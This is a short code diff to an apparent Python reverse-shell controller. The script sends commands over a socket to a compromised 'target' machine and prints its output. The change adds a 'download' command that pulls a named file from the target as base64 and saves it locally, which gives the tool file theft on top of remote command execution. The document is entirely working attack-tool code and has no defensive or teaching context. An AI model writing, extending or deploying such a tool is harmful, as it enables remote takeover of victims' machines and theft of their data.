@@ -2,6 +2,7 @@
 #_*_ codign: utf8 _*_
 
 import socket
+import base64
 
 def shell():
     current_dir = target.recv(1024)
@@ -17,6 +18,11 @@ def shell():
             print(res)
         elif comando == "":
             pass
+        elif comando[:8] == "download":
+            target.send(comando)
+            with open(comando[9:], 'wb') as file_download:
+                datos  = target.recv(90000000)
+                file_download.write(base64.b64decode(datos))
         else:
             target.send(comando)
             res = target.recv(30000)
